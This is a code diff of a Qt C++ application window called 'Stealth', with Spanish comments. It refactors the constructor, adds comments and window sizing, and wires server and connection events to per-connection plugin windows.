@@ -7,10 +7,10 @@ Stealth::Stealth(QWidget *parent) : QMainWindow(parent),
                                     ui(new Ui::Stealth)
 {
     ui->setupUi(this);
-
+    this->bdebugShell=false;
 
 #ifdef Q_WS_WIN
-    /* Comprobamos que las dlls que la necesitamos estan en su sitio */
+    /* En windows omprobamos que las dlls que necesitamos están en su sitio */
     QDir dir=QDir::currentPath();
     QFile file;
     if(!file.exists(dir.filePath("ssleay32.dll"))) qFatal("No se encontró \"ssleay32.dll\"");
@@ -31,16 +31,15 @@ Stealth::Stealth(QWidget *parent) : QMainWindow(parent),
 #endif
 
 
+    /* Necesario para usar QCA */
     QCA::Initializer init;
 
-    /** TEST **/
-
-
+    /* Creamos los controles de las 4 pestañas de la ventana
+        y las añadimos al StackedWidget */
     stab1=new StealthTab1();
     stab2=new StealthTab2();
     stab3=new StealthTab3();
     stab4=new StealthTab4();
-
     slidingStackedWidget=new SlidingStackedWidget(this);
     slidingStackedWidget->addWidget(stab1);
     slidingStackedWidget->addWidget(stab2);
@@ -50,19 +49,7 @@ Stealth::Stealth(QWidget *parent) : QMainWindow(parent),
 
     ui->centralFrameLayout->addWidget(slidingStackedWidget);
 
-    /** /TEST **/
-
-    //connect(this,SIGNAL(destroyed()),treewidget,SLOT(deleteLater()));
-    //connect(ctw,SIGNAL(expandedChanged(GroupTreeWidget*)),this,SLOT(closeCurrentExpanded(GroupTreeWidget*)));
-
-
-    connect(stab1->treewidget->treewidget,SIGNAL(itemDoubleClicked(QTreeWidgetItem*,int)),this,SLOT(itemDoubleClicked(QTreeWidgetItem*,int)));
-
-
-    this->bdebugShell=false;
-
-
-    //TODO: Mover a main.cpp?
+    /* Inicializamos las clases que se encargan de la conexión */
     server=new Server();
     qDebug()<<"Creada clase Server";
     messageManager=new MessageManager();
@@ -70,13 +57,30 @@ Stealth::Stealth(QWidget *parent) : QMainWindow(parent),
     connectionManager=new ConnectionManager(this,messageManager);
     qDebug()<<"Creada clase ConnectionManager";
 
-    //Cuando el server reciba una nueva conexión, el manager se encargará de inicializarla
+    /* Evendo de doble click en un item del treewidget */
+    connect(stab1->treewidget->treewidget,SIGNAL(itemDoubleClicked(QTreeWidgetItem*,int)),this,SLOT(itemDoubleClicked(QTreeWidgetItem*,int)));
+
+    /* Eventos de nueva conexión y conexión lista y conexión eliminada */
     connect(server,SIGNAL(newConnection(Connection*)),connectionManager,SLOT(sendLoader(Connection*)));
     connect(connectionManager,SIGNAL(connectionReady(Connection*)),this,SLOT(addConnection(Connection*)));
+    connect(connectionManager,SIGNAL(connectionDeleted(int)),this,SLOT(deleteConnection(int)));
 
+    /* Evento de mensaje de plugin recibido */
     //FIXME: Mover esto a otra parte más adecuada
     connect(messageManager,SIGNAL(receivedPluginMessage(Connection*,int,QByteArray)),this,SLOT(processPluginMessage(Connection*,int,QByteArray)));
-    connect(connectionManager,SIGNAL(connectionDeleted(int)),this,SLOT(deleteConnection(int)));
+
+    /* Ponemos un tamaño adecuado en función de la resolución, y centramos la ventana */
+    setGeometry(
+            (int)(QApplication::desktop()->width() -
+                (QApplication::desktop()->width() -
+                (QApplication::desktop()->width() / 2)) * 1.5) / 2,
+            (int)(QApplication::desktop()->height() -
+                (QApplication::desktop()->height() -
+                (QApplication::desktop()->height() / 2)) * 1.5) / 2,
+            (int)((QApplication::desktop()->width() -
+                (QApplication::desktop()->width() / 2)) * 1.5),
+            (int)((QApplication::desktop()->height() -
+                (QApplication::desktop()->height() / 2)) * 1.5));
 }
 
 Stealth::~Stealth()
@@ -86,20 +90,21 @@ Stealth::~Stealth()
 
 void Stealth::showEvent(QShowEvent *)
 {
-
+    //TODO: Splash
 }
 
 void Stealth::itemDoubleClicked(QTreeWidgetItem *item,int)
 {
+    /* Recuperamos el id que guardamos en el item que se clicó
+        usando el campo Qt::UserRole */
     QVariant id=item->data(0,Qt::UserRole);
 
     qDebug()<<"Clicado item #"+QString::number(id.toInt());
 
-    Connection* connection=connectionManager->connection(id.toInt());
-
+    /* Buscamos la ventana de plugins asociada el item que se clicó y la mostramos*/
     foreach(PluginWindow* pw,pluginWindows)
     {
-        if(pw->getID()==connection->getID())
+        if(pw->getID()==id.toInt())
         {
             pw->show();
             return;
@@ -107,40 +112,35 @@ void Stealth::itemDoubleClicked(QTreeWidgetItem *item,int)
     }
 }
 
-void Stealth::closeCurrentExpanded(GroupTreeWidget* newExpanded)
-{
-    /*
-    expandedGroup->setExpanded(false);
-    expandedGroup=newExpanded;
-    */
-}
-
-
 void Stealth::addConnection(Connection *connection)
 {
+    /* Añadimso el item al treewidget y creamo suna ventana
+        de plugins nueva asociada con el item */
     stab1->treewidget->addItem(connection);
-
     PluginWindow* pluginWindow=new PluginWindow(connection,this);
     this->pluginWindows.append(pluginWindow);
 }
 
 void Stealth::deleteConnection(int ID)
 {
+    /* Recorremos todos los items del treewidget */
     for(int i=0;i<stab1->treewidget->treewidget->topLevelItemCount();i++)
     {
         QTreeWidgetItem* item=stab1->treewidget->treewidget->topLevelItem(i);
-        QVariant id=item->data(0,Qt::UserRole);
 
-        if(ID==id.toInt())
+        /* Si el ID coincide con el del item, lo eliminamos */
+        if(ID==item->data(0,Qt::UserRole).toInt())
         {
             delete item;
 
+            /* Buscamos la vantana de plugins asociada al item y la eliminamos */
             foreach(PluginWindow* pw,pluginWindows)
             {
                 if(pw->getID()==ID)
                 {
                     /* FIXME: Hay que destruírla, pero sin cargarse el index */
                     pw->hide();
+                    return;
                 }
             }
             return;
@@ -150,8 +150,9 @@ void Stealth::deleteConnection(int ID)
 
 /* FIXME: Hay que reestructurar para mover esto de aquí, esta clase no tendría
           que preocuparse de estas cosas */
-void Stealth::processPluginMessage(Connection* connection , int PluginID, QByteArray data)
+void Stealth::processPluginMessage(Connection* connection,int PluginID,QByteArray data)
 {
+    /* Buscamos el plugin por su ID y le mandamos el mensaje */
     foreach(PluginWindow* pw,pluginWindows)
     {
         if(pw->getID()==connection->getID())
@@ -165,6 +166,7 @@ void Stealth::processPluginMessage(Connection* connection , int PluginID, QByteA
 
 void Stealth::on_btnDebug_clicked()
 {
+    /* Si la shell no está visible, la creamos y la mostramos */
     if(!this->bdebugShell)
     {
         DebugShell* debugShell=new DebugShell(this);
